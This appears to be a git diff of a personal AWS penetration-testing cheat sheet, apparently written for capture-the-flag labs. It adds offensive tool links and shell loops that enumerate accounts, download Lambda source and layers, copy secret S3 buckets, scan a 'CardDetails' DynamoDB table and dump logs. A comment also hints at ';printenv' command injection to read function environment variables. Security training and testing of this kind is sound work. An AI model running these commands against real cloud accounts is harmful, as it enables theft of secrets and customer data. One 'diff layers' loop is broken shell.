@@ -1,5 +1,9 @@
 ## Tools 
 
+- <​https://awspolicygen.s3.amazonaws.com/policygen.html>
+- <https://github.com/toniblyx/my-arsenal-of-aws-security-tools#offensive>
+- <https://github.com/RhinoSecurityLabs/Security-Research/tree/master/tools/aws-pentest-tools>
+- <https://github.com/andresriancho/enumerate-iam>
 - Amazon Web Services In Plain English: <https://expeditedsecurity.com/aws-in-plain-english/>
 - The AWS exploitation framework, designed for testing the security of Amazon Web Services environments: <https://github.com/RhinoSecurityLabs/pacu>
 - Security tool to perform AWS security best practices assessments: <https://github.com/toniblyx/prowler>
@@ -133,38 +137,128 @@ Hack : Upload a file to S3 bucket using method set_contents_from_filename
 Hack : Upload a file to s3 bucket using the method send_file
 ```
 
-List all regions:
-```bash
-for region in `aws ec2 describe-regions --output text | cut -f4`
-do
-     echo -e "\nListing Instances in region:'$region'..."
-     aws ec2 describe-instances --region $region
-done
-```
-
-```
-for region in `aws ec2 describe-regions --output text | cut -f4`
-do
-     echo -e "\nListing Instances in region:'$region'..."
-     aws apigateway get-rest-apis  --region $region
-done
-```
-
 ```
 aws s3 sync s3://developers-secret-bucket ./developers-secret-bucket
-aws s3 ls s3://developers-secret-bucket
-aws s3api list-objects --bucket developers-secret-bucket
-aws s3api list-objects-v2 --bucket developers-secret-bucket
 aws s3 cp s3://developers-secret-bucket ./developers-secret-bucket1 --recursive
 ```
 
 ```
-aws apigateway get-rest-apis
-aws apigateway get-resources --rest-api-id wjpu20uslg
-aws apigateway get-stages --rest-api-id wjpu20uslg
 aws dynamodb scan --table-name CardDetails
 
 awslogs groups
 awslogs streams /aws/lambda/DataExtractor
 awslogs get /aws/lambda/DataExtractor
+```
+
+```bash
+aws lambda list-event-source-mappings --profile main > event-source-mappings.json
+
+aws lambda list-functions --profile main > lambda-functions.json
+cat lambda-functions.json | jq -r ".Functions[] | .FunctionName" | while read -r line; do
+    aws lambda list-aliases --function-name $line --profile main > lambda-$line-aliases.json
+    aws lambda list-function-event-invoke-configs --function-name $line --profile main >  lambda-$line-event-invoke-configs.json
+
+    aws lambda list-versions-by-function --function-name $line --profile main > lambda-$line-versions.json
+    cat lambda-$line-versions.json | jq -r ".Versions[] | .Version" | while read -r versionline; do
+
+        aws lambda get-function --function-name $line --qualifier "$versionline" --profile main > lambda-$line-version-$versionline.json
+        
+        mkdir lambda-$line-version-$versionline
+        cd lambda-$line-version-$versionline
+        wget `cat ../lambda-$line-version-$versionline.json |  jq -r ".Code | .Location"` -O source.zip
+        unzip source.zip
+        cd ..
+
+    done
+done  
+
+aws lambda list-layers --profile main > lambda-layers.json
+cat lambda-layers.json | jq -r ".Layers[] | .LayerName" | while read -r line; do
+    aws lambda list-layer-versions --layer-name $line --profile main > lambda-layer-$line-versions.json
+
+    cat lambda-layer-$line-versions.json | jq -r ".LayerVersions[] | .Version" | while read -r versionline; do
+        aws lambda get-layer-version --layer-name $line --version-number $versionline --profile main > lambda-layer-$line-version-$versionline.json
+
+        mkdir lambda-layer-$line-version-$versionline
+        cd lambda-layer-$line-version-$versionline
+        wget `cat ../lambda-layer-$line-version-$versionline.json | jq -r ".Content | .Location"` -O source.zip
+        unzip source.zip
+        cd ..
+    done
+done
+
+# Diff layers 
+$prev_version=''
+cat lambda-layers.json | jq -r ".Layers[] | .LayerName" | while read -r line; do
+    if prev_version ==  ''
+        $prev_version=$line
+    else
+        diff -urN 
+    fi
+done
+
+```
+```bash
+
+for region in `aws ec2 describe-regions --output text | cut -f4`
+do
+    aws ec2 describe-instances --region $region --profile student
+     
+    aws ec2 describe-instances-attribute --attribute usedData --instance-id $$ID$$ --region $region
+
+    aws apigateway get-rest-apis  --region $region
+
+    aws secretsmanager list-secrets
+
+    aws s3 ls
+
+    aws s3 ls s3://$$bucket-name$$ --region $region
+
+
+    aws s3api list-objects --bucket $$bucket-name$$ --region $region
+    aws s3api list-objects-v2 --bucket $$bucket-name$$ --region $region
+    # versions of bucket
+    aws s3api list-object-versions --bucket data-extractor-repo --profile student
+    aws s3api list-object-versions --bucket data-extractor-repo --profile student | jq -r ".Versions[] | .VersionId"
+    aws s3api get-object --bucket data-extractor-repo --key DataExtractor.zip --version-id S5l9yGDb_u0XR96U3tQexZMtmn1t6HUZ latest.zip --profile student
+    
+    aws --endpoint http://192.69.97.3:9000 s3api list-buckets
+    aws --endpoint http://192.69.97.3:9000 s3 ls s3://hello-world
+    ​aws --endpoint http://192.69.97.3:9000 s3api get-bucket-policy --bucket welcome
+
+
+
+    aws s3 cp s3://developers-secret-bucket/dave-shared-bucket/flag.txt . --region $region
+    aws s3api get-bucket-policy --bucket temporary-public-image-store --profile student
+
+    aws lambda list-functions --region $region
+    aws lambda get-function --function-name serverlessrepo-image-uploader-uploader-RM72CSUT4KDA --region $region
+    aws lambda list-versions-by-function --function-name DataExtractor --profile student --region us-west-2
+    # get code of a version
+    aws lambda get-function --function-name DataExtractor --qualifier 1 --profile student --region us-west-2
+    aws lambda  list-aliases --function-name FileUploader
+
+    aws apigateway get-rest-apis  --region $region
+    aws apigateway get-stages --rest-api-id 43iqo53xr7 --region $region
+    aws apigateway get-resources --rest-api-id 43iqo53xr7 --region $region
+
+    # https://cwlw44ht84.execute-api.ap-southeast-1.amazonaws.com/Prod
+    # ;printenv to read env variables used by function
+    
+    # https://gist.github.com/eldondevcg/fffff4b7909351b19a53
+    aws logs describe-log-groups --profile student --region us-east-1
+    aws logs describe-log-streams --log-group-name /aws/lambda/DataExtractor --profile student --region us-east-1
+    aws logs describe-log-streams --log-group-name /aws/lambda/DataExtractor --profile student --region us-east-1 | jq ".logStreams[] | .logStreamName"
+    aws logs get-log-events --log-group-name /aws/lambda/DataExtractor --log-stream-name '2020/10/29/[$LATEST]81c6e324b37a46baa2078ba80d1f99bc' --start-time 1603674938 --profile student --region us-east-1 >> out.log
+    awslogs get /aws/lambda/StressTester --profile student
+    # logs might be available only when the start date is less than the time at which the log was recorded
+    awslogs get /aws/lambda/StressTester --start '2d' --profile student | grep -i flag
+
+    # dynamodb operator injection possible too
+    aws dynamodb list-backups
+    aws dynamodb list-tables
+    aws dynamodb list-global-tables
+    aws dynamodb scan --table-name CardDetails --profile student --region us-east-1
+
+done
 ```
